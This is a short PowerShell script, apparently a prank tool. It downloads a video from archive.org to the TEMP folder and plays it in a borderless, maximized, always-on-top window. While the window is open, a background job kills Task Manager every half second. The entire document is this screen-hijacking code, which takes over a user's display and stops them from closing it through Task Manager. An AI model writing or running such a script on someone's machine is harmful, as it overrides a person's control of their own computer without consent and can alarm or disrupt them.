Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase

$url = "https://archive.org/download/youtube-xvFZjo5PgG0/xvFZjo5PgG0.mp4"
$vid = "$env:TEMP\v.mp4"

if (!(Test-Path $vid)) {
    (New-Object System.Net.WebClient).DownloadFile($url, $vid)
}

$player = New-Object System.Windows.Controls.MediaElement
$player.Source = $vid
$player.LoadedBehavior = "Play"
$player.Stretch = "UniformToFill"

$window = New-Object System.Windows.Window
$window.Content = $player
$window.WindowStyle = "None"
$window.WindowState = "Maximized"
$window.Topmost = $true
$window.Background = "Black"

$job = Start-Job -ScriptBlock {
    while($true) { 
        Stop-Process -Name taskmgr -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500 
    }
}

$window.Add_Closed({
    Stop-Job $job -ErrorAction SilentlyContinue
    Stop-Process -Id $PID -Force
})

$window.ShowDialog() | Out-Null